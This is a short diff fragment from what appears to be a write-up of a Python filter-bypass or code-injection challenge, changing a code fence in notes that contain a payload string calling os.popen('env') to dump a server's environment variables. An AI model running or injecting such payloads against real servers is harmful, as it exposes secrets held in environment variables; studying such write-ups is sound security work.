@@ -55,7 +55,7 @@ app.run(host="0.0.0.0", port=8000)
 
 
 i tried alot of methods but this method worked well for me:
-```
+```py
 a="__import__('os').popen('env').read()"
 l=[]
 for i in a:
